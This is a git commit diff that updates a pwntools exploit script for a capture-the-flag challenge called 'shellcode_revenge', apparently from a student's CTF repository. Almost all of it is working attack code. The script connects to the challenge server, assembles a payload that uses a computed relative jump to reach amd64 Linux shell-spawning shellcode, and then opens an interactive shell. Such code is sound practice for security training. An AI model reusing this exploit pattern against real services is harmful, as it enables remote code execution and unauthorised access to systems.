d91a8e7a1479e4978d93262d5bd7c482b412b662
ktshen <bruce20036@gmail.com>
2017-12-19 20:16:04 +0800

    Add shellcode_revenge.py

--- shellcode_revenge/shellcode_revenge.py
+++ shellcode_revenge/shellcode_revenge.py
@@ -1,18 +1,14 @@
 from pwn import *
 
-host, port = "ctf.adl.csie.ncu.edu.tw", 11003
-#p = remote(host, port)
-p = process('./shellcode_revenge')
-sleep(10)
+host, port = "ctf.adl.csie.ncu.edu.tw", 11004
+p = remote(host, port)
 
-shellcode = "\x0F\x05\x56\xC3"
+#p = process('./shellcode_revenge')
+context.arch = 'amd64'
 
-print p.recv()
-#print p.recv()
-p.send(shellcode)
-#p.send("aaaaa")
-print p.recv()
-p.send('aaaaaaa')
+payload = asm('pop rdx')
+payload += asm('lab: ret\n'+'ret\n'*0x200a15+'jmp lab')[-5:]	#0x601059-0x400644 = 0x200a15
+payload +=asm(shellcraft.amd64.linux.sh())
+
+p.sendline(payload)
 p.interactive()
-
-
